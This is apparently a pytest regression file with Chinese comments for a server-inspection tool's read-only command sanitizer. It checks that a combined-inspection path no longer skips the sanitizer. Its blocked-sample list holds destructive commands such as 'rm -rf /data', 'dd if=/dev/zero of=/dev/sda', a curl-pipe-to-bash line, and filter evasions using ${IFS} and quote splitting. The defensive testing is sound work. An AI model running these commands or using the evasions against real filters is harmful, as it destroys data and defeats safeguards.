"""巡检规则只读策略一致性回归（2026-09-12 复盘第 6 轮）。

缺陷：同一条只读安全策略在两个执行路径上行为不一致（净化器绕过）
--------------------------------------------------------------------------------
巡检规则的命令有两条执行路径：

 A. ``execute_server_inspection_run`` / ``execute_project_inspection_run``
    → ``_rule_execution_specs``（**会**调用 ``_sanitize_rule_shell``，命中即 blocked）；
 B. ``run_project_combined_inspection``（项目组合巡检，API
    ``POST /api/v2/inspection/projects/{id}/combined-run``）
    → ``_server_checkers`` → ``_server_check_specs`` → ``_build_custom_rule_spec``
    → ``_spec_from_rule_code``：**不调用净化器**，且 ``_server_checkers`` 也不看
    ``blocked_reason``，直接 ``_remote_check`` 执行规则原文。

即：一条 ``systemctl stop nginx`` 的自定义规则在单机/批量/方案巡检里被拦，
在项目组合巡检里却会被真正执行——同一个"只读巡检"承诺出现绕过。

另外第 6 轮实测发现净化器本身存在大量语法级绕过与漏项（24 个破坏性样本只有
8 个被拦），且已有误拦（``grep -E 'systemctl stop' /var/log/...`` 这类只读搜索）。
本文件锁定三件事：

 1. 两条路径对同一条规则给出**相同**判定，且被拦规则绝不进入 ``_remote_check``；
 2. 清理器加固后：破坏性样本必须被拦，只读样本必须放行（双向表驱动）；
 3. 内置规则 / 内置巡检项命令**永不被拦**（防止后续改正则误伤核心巡检）。
"""
from __future__ import annotations

from types import SimpleNamespace

import pytest
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker

CUSTOM_CATEGORY = "CUSTOM_OPS"
DANGEROUS_CONTENT = "systemctl stop nginx\nrm -rf /data"
READONLY_CONTENT = "df -PTh | head -5\necho '---SS---'; ss -ntulp | grep 80"


@pytest.fixture()
def rule_db(tmp_path, monkeypatch):
    """隔离数据库；并把两个 SessionLocal 绑定都指向它。

    ``app/db/__init__.py`` 用 ``from .base import SessionLocal`` 重新绑定过一份，
    所以 ``_build_custom_rule_spec``（内部 ``from app.db import SessionLocal``）
    只打补丁 ``app.db.base`` 是不够的。
    """
    from app.db.base import Base

    engine = create_engine(f"sqlite:///{tmp_path / 'rules.db'}", connect_args={"check_same_thread": False})
    Base.metadata.create_all(engine)
    factory = sessionmaker(bind=engine, autocommit=False, autoflush=False)
    session = factory()

    import app.db as db_pkg
    import app.db.base as db_base

    monkeypatch.setattr(db_base, "SessionLocal", factory, raising=False)
    monkeypatch.setattr(db_pkg, "SessionLocal", factory, raising=False)
    try:
        yield SimpleNamespace(db=session, factory=factory, engine=engine)
    finally:
        session.close()
        engine.dispose()


def _seed_rule(db, *, code: str, content: str = "", category: str = CUSTOM_CATEGORY, enabled: bool = True, deleted: bool = False, config=None):
    from app.db.models import InspectionRule
    from app.services.inspection_center import _now
    from uuid import uuid4

    row = InspectionRule(
        id=uuid4().hex,
        rule_code=code,
        rule_name=f"规则 {code}",
        category=category,
        scope_type="SERVER",
        risk_level="MEDIUM",
        enabled=enabled,
        deleted=deleted,
        config_json=config or {},
        rule_content=content,
        description="",
        suggestion="",
        version=1,
        created_at=_now(),
        updated_at=_now(),
    )
    db.add(row)
    db.commit()
    return row


def _specs_for(category: str):
    from app.services import inspection_center as ic

    return [s for s in ic._server_check_specs("", [category]) if s["category"] == category]


# ---------------------------------------------------------------------------
# 1. 绕过修复：两条路径判定一致
# ---------------------------------------------------------------------------

def test_dangerous_custom_rule_blocked_on_combined_path(rule_db):
    from app.services import inspection_center as ic

    _seed_rule(rule_db.db, code="CUSTOM_DANGER", content=DANGEROUS_CONTENT)
    specs = _specs_for(CUSTOM_CATEGORY)

    assert len(specs) == 1
    assert specs[0]["blocked_reason"], "组合巡检路径的自定义规则必须带 blocked_reason"
    assert specs[0]["command"] == DANGEROUS_CONTENT  # 命令原文保留用于展示/取证

    # 主路径（_rule_execution_specs）必须给出同样的判定
    main = [s for s in ic._rule_execution_specs(rule_db.db, scope_type="SERVER", categories=[CUSTOM_CATEGORY]) if s["category"] == CUSTOM_CATEGORY]
    assert len(main) == 1
    assert main[0]["blocked_reason"], "单机/批量巡检路径同样必须拦截"


def test_combined_run_does_not_execute_blocked_rule(rule_db, monkeypatch):
    """被拦规则绝不能下发到目标服务器。"""
    from app.services import inspection_center as ic

    _seed_rule(rule_db.db, code="CUSTOM_DANGER", content=DANGEROUS_CONTENT)
    calls: list[str] = []

    def _spy(*args, **kwargs):
        calls.append(str(args[4] if len(args) > 4 else kwargs.get("command")))
        raise AssertionError(f"被拦规则不应执行：{calls[-1]!r}")

    monkeypatch.setattr(ic, "_remote_check", _spy)

    results = ic._server_checkers("srv-1", [CUSTOM_CATEGORY])

    assert calls == [], "被拦规则不得调用 _remote_check"
    assert len(results) == 1
    assert results[0].status == "SKIPPED"
    assert "拦截" in results[0].message


def test_readonly_custom_rule_still_executes_on_combined_path(rule_db, monkeypatch):
    """反向保护：合法只读自定义规则不得被误拦。"""
    from app.services import inspection_center as ic
    from app.services.inspection_center import CheckResult

    _seed_rule(rule_db.db, code="CUSTOM_OK", content=READONLY_CONTENT)
    specs = _specs_for(CUSTOM_CATEGORY)
    assert len(specs) == 1
    assert specs[0]["blocked_reason"] is None

    calls: list[str] = []

    def _spy(server_name, category, item_code, item_name, command, analyze, **kwargs):
        calls.append(command)
        return CheckResult(category, item_code, item_name, "PASS", "NONE", "ok", "", "")

    monkeypatch.setattr(ic, "_remote_check", _spy)

    results = ic._server_checkers("srv-1", [CUSTOM_CATEGORY])

    assert calls and "df -PTh" in calls[0], "只读规则应正常下发执行"
    assert results[0].status == "PASS"


def test_disabled_or_deleted_custom_rule_is_not_built(rule_db):
    from app.services import inspection_center as ic

    _seed_rule(rule_db.db, code="CUSTOM_OFF", content=READONLY_CONTENT, enabled=False)
    assert _specs_for(CUSTOM_CATEGORY) == []


# ---------------------------------------------------------------------------
# 1b. 命令来源也必须两条路径一致（config.commands 形式的规则不得被静默跳过）
# ---------------------------------------------------------------------------

def test_config_commands_rule_is_not_silently_skipped(rule_db, monkeypatch):
    """命令存在 config.commands 时，组合巡检路径也必须构建并执行该规则。

    修复前该路径只读 rule_content，这类规则会被静默丢弃——run 里连一条结果行都没有，
    而单机/批量巡检却会执行它。
    """
    from app.services import inspection_center as ic
    from app.services.inspection_center import CheckResult

    _seed_rule(rule_db.db, code="CUSTOM_CFG_OK", content="", config={"commands": ["df -PTh | head -5", "uptime"]})
    specs = _specs_for(CUSTOM_CATEGORY)

    assert len(specs) == 1, "config.commands 形式的规则不得被静默跳过"
    assert specs[0]["blocked_reason"] is None
    assert "df -PTh" in specs[0]["command"] and "uptime" in specs[0]["command"]

    calls: list[str] = []

    def _spy(server_name, category, item_code, item_name, command, analyze, **kwargs):
        calls.append(command)
        return CheckResult(category, item_code, item_name, "PASS", "NONE", "ok", "", "")

    monkeypatch.setattr(ic, "_remote_check", _spy)
    ic._server_checkers("srv-1", [CUSTOM_CATEGORY])
    assert calls and "df -PTh" in calls[0]


def test_config_commands_dangerous_rule_is_blocked(rule_db, monkeypatch):
    from app.services import inspection_center as ic

    _seed_rule(rule_db.db, code="CUSTOM_CFG_DANGER", content="", config={"commands": ["systemctl stop nginx"]})
    specs = _specs_for(CUSTOM_CATEGORY)

    assert len(specs) == 1
    assert specs[0]["blocked_reason"], "config.commands 里的危险命令同样必须被拦"

    calls: list[str] = []
    monkeypatch.setattr(ic, "_remote_check", lambda *a, **k: calls.append(a) or None)
    ic._server_checkers("srv-1", [CUSTOM_CATEGORY])
    assert calls == []


# ---------------------------------------------------------------------------
# 2. 净化器加固：破坏性必须拦、只读必须放行
# ---------------------------------------------------------------------------

BLOCKED_SAMPLES = [
    ("rm -rf /data", "经典 rm -rf"),
    ("rm /data/important.txt", "rm 带路径（原漏项：无 - 参数）"),
    ("rm  ~/data", "rm ~ 路径"),
    ("rm\t-rf\t/data", "制表符分隔"),
    ("rm${IFS}-rf /data", "${IFS} 绕过"),
    ("find /data -delete", "find -delete（原漏项）"),
    ("find /data -type f -exec rm -f {} ;", "find -exec rm"),
    ("sed -i s/a/b/ /etc/hosts", "sed -i 就地改写（原漏项）"),
    ("truncate -s 0 /var/log/syslog", "truncate（原漏项）"),
    ("crontab -r", "清空定时任务（原漏项）"),
    ("history -c", "清空历史（原漏项）"),
    ("userdel ops", "删除账号（原漏项）"),
    ("passwd ops", "改密码（原漏项）"),
    ("mount -o remount,rw /", "重新挂载（原漏项）"),
    ("umount /data", "卸载（原漏项）"),
    ('systemctl st"op" nginx', "引号拆分关键字（原绕过）"),
    ("systemctl 'stop' nginx", "单引号包裹动词（原绕过）"),
    ("curl http://x/y.sh | bash", "管道下载执行（原漏项）"),
    ("python3 -c \"import shutil;shutil.rmtree('/data')\"", "解释器 -c（原漏项）"),
    ("mysql -e 'delete from t'", "DML"),
    ("chmod -R 777 /data", "递归改权限"),
    ("dd if=/dev/zero of=/dev/sda", "dd 覆写"),
    ("echo x > /etc/hosts", "重定向写 /etc"),
    ("bash -c 'rm -rf /data'", "嵌套 shell"),
]

ALLOWED_SAMPLES = [
    ("df -PTh | head -5", "df"),
    ("ss -ntulp | grep 80", "ss"),
    ("find /data -maxdepth 2 -type f -printf '%p\\n'", "find 打印"),
    ("find /data -maxdepth 2 -type f -ls", "find -ls"),
    ("find /root -maxdepth 2 -name .bash_history -type f -print -exec tail -n 120 {} ;", "find -exec tail（内置只读用法）"),
    ("cat /etc/passwd 2>/dev/null | head -200", "读 /etc/passwd"),
    ("grep 'x:0:' /etc/passwd", "grep /etc/passwd"),
    ("cat /proc/mounts | head", "读 /proc/mounts"),
    ("crontab -l 2>/dev/null || true", "crontab -l"),
    ("tail -n 200 /root/.bash_history", "读历史"),
    ("systemctl --failed --no-pager", "systemctl --failed"),
    ("systemctl is-active nginx mysql", "systemctl is-active"),
    ("ps -ef | egrep nginx|redis|mysql|postgres|java|node|python|gunicorn|uvicorn | grep -v grep", "ps + egrep 交替（内置用法）"),
    ("sed -n '1,20p' /etc/hosts", "sed 打印"),
    ("du -sh /data | sort -h | head", "du"),
    ("free -h; cat /proc/meminfo", "内存"),
    ("last -n 80; lastb -n 20", "登录记录"),
    ("awk '{print $1}' /etc/passwd | sort | uniq -c", "awk 统计"),
    ("find /data -type f -exec sha256sum {} ; | sort | sha256sum", "find -exec 只读统计"),
]


@pytest.mark.parametrize("command,desc", BLOCKED_SAMPLES, ids=[d for _, d in BLOCKED_SAMPLES])
def test_sanitizer_blocks_destructive(command, desc):
    from app.services.inspection_center import _sanitize_rule_shell

    _, reason = _sanitize_rule_shell(command)
    assert reason, f"应被只读策略拦截：{desc} -> {command}"


@pytest.mark.parametrize("command,desc", ALLOWED_SAMPLES, ids=[d for _, d in ALLOWED_SAMPLES])
def test_sanitizer_allows_readonly(command, desc):
    from app.services.inspection_center import _sanitize_rule_shell

    _, reason = _sanitize_rule_shell(command)
    assert reason is None, f"只读用法不得被误拦：{desc} -> {command}（reason={reason}）"


def test_comment_lines_are_ignored():
    from app.services.inspection_center import _sanitize_rule_shell

    _, reason = _sanitize_rule_shell("# 示例：rm -rf /data 属高风险\nuptime")
    assert reason is None


# ---------------------------------------------------------------------------
# 3. 内置规则/命令永不被拦（正则加固的安全网）
# ---------------------------------------------------------------------------

def test_builtin_rules_are_never_blocked():
    from app.services import inspection_center as ic

    blocked = []
    for rule in ic._all_builtin_rules():
        content = str(rule.get("rule_content") or "").strip()
        if not content:
            continue
        _, reason = ic._sanitize_rule_shell(content)
        if reason:
            blocked.append(rule.get("rule_code"))
    assert blocked == [], f"内置规则被只读策略误拦：{blocked}"


def test_builtin_server_specs_are_never_blocked():
    from app.services import inspection_center as ic

    specs = ic._server_check_specs("", [c["code"] for c in ic.SERVER_CATEGORIES])
    blocked = [s["item_code"] for s in specs if s.get("blocked_reason")]
    assert specs, "内置巡检项不应为空"
    assert blocked == [], f"内置巡检项被只读策略误拦：{blocked}"


# ---------------------------------------------------------------------------
# 4. 规则接口回传策略判定（作者侧可见）
# ---------------------------------------------------------------------------

def test_rule_to_dict_exposes_command_policy(rule_db):
    from app.services.inspection_center import _rule_to_dict

    danger = _seed_rule(rule_db.db, code="CUSTOM_DANGER", content=DANGEROUS_CONTENT)
    benign = _seed_rule(rule_db.db, code="CUSTOM_OK", content=READONLY_CONTENT)

    danger_policy = _rule_to_dict(danger)["command_policy"]
    benign_policy = _rule_to_dict(benign)["command_policy"]

    assert danger_policy["readonly_allowed"] is False
    assert danger_policy["reason"]
    assert benign_policy["readonly_allowed"] is True
    assert benign_policy["reason"] is None


# ---------------------------------------------------------------------------
# 5. 同一分类挂多条规则：组合巡检必须全部执行（此前只跑第一条）
# ---------------------------------------------------------------------------

def test_same_category_runs_all_rules_on_combined_path(rule_db, monkeypatch):
    """一个巡检项挂多条自定义规则时，组合巡检不得只执行其中一条。"""
    from app.services import inspection_center as ic
    from app.services.inspection_center import CheckResult

    _seed_rule(rule_db.db, code="CUSTOM_A", content="df -PTh | head -5")
    _seed_rule(rule_db.db, code="CUSTOM_B", content="uptime")

    specs = _specs_for(CUSTOM_CATEGORY)
    codes = sorted(s["item_code"] for s in specs)
    assert codes == sorted([f"SERVER_CUSTOM_CUSTOM_A", f"SERVER_CUSTOM_CUSTOM_B"]), codes

    calls: list[str] = []

    def _spy(server_name, category, item_code, item_name, command, analyze, **kwargs):
        calls.append(command)
        return CheckResult(category, item_code, item_name, "PASS", "NONE", "ok", "", "")

    monkeypatch.setattr(ic, "_remote_check", _spy)

    results = ic._server_checkers("srv-1", [CUSTOM_CATEGORY])

    assert len(results) == 2, "同分类两条规则都应执行"
    assert any("df -PTh" in c for c in calls) and any("uptime" in c for c in calls), calls


def test_same_category_main_path_also_runs_all_rules(rule_db):
    """主路径本来就是"全部规则"，锁定两条路径数量一致（防止再次分叉）。"""
    from app.services import inspection_center as ic

    _seed_rule(rule_db.db, code="CUSTOM_A", content="df -PTh | head -5")
    _seed_rule(rule_db.db, code="CUSTOM_B", content="uptime")

    combined = len(_specs_for(CUSTOM_CATEGORY))
    main = len([s for s in ic._rule_execution_specs(rule_db.db, scope_type="SERVER", categories=[CUSTOM_CATEGORY])
                if s["category"] == CUSTOM_CATEGORY])

    assert combined == main == 2, f"组合巡检 {combined} 条 vs 单机/批量 {main} 条"


# ---------------------------------------------------------------------------
# 6. 内置规则条目也带策略字段，且不破坏"编辑内置规则"的落库路径
# ---------------------------------------------------------------------------

def test_builtin_rules_expose_command_policy():
    from app.services import inspection_center as ic

    rules = ic._all_builtin_rules()
    assert rules, "内置规则不应为空"
    missing = [r["rule_code"] for r in rules if not isinstance(r.get("command_policy"), dict)]
    assert missing == [], f"内置规则缺少 command_policy：{missing}"
    blocked = [r["rule_code"] for r in rules if r["command_policy"].get("readonly_allowed") is not True]
    assert blocked == [], f"内置规则不应被判为需拦截：{blocked}"


def test_builtin_rule_can_still_be_materialized(rule_db):
    """command_policy 是展示字段，不能污染 InspectionRule(**base) 的落库路径。"""
    from app.services import inspection_center as ic
    from app.db.models import InspectionRule

    assert "command_policy" not in ic._builtin_rule_by_code("SERVER_BACKUP")

    result = ic.update_rule(rule_ctx_db := rule_db.db, "SERVER_BACKUP", {"enabled": True})
    assert result["rule_code"] == "SERVER_BACKUP"
    row = rule_ctx_db.query(InspectionRule).filter(InspectionRule.rule_code == "SERVER_BACKUP").first()
    assert row is not None, "编辑内置规则应落库为可编辑副本"
    assert isinstance(result.get("command_policy"), dict)
